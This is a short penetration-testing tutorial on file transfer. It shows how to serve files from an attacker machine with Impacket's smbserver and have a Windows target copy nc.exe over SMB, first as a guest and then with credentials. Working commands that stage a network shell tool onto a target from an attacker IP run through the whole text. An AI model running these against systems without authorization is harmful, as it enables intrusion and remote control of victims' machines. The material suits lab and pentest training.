
## 1. Start an SMB Server (Attacker Machine)

Use **Impacket’s `smbserver.py`** to share a folder from your attack box.

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

This shares the folder `/tmp/smbshare` with the name **share**.

---

## 2. Download a File on Windows (Target Machine)

From the **Windows target** machine:

```powershell
copy \\192.168.220.133\share\nc.exe
```

This copies `nc.exe` from the attacker’s `/tmp/smbshare` folder to the **current directory** on the Windows system.

Example output:

```
1 file(s) copied.
```

---

## 3. Fix Guest Access Issues

If you see this error:

```
You can't access this shared folder because your organization's security policies block unauthenticated guest access
```

It means guest access is blocked.  
Use **authentication** instead.

---

## 4. Start SMB with Credentials (Attacker Machine)

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

---

## 5. Map the SMB Share on Windows (Target Machine)

Map the shared folder as a drive:

```cmd
net use n: \\192.168.220.133\share /user:test test
```

Then copy the file:

```cmd
copy n:\nc.exe
```

Output:

```
1 file(s) copied.
```

---

## Tips

- Always use **`-smb2support`** for better compatibility with modern systems.
    
- Map to a drive letter (`n:` in the example) for easier navigation.
    
- If SMB traffic is filtered, consider tunneling over other protocols.
    

---

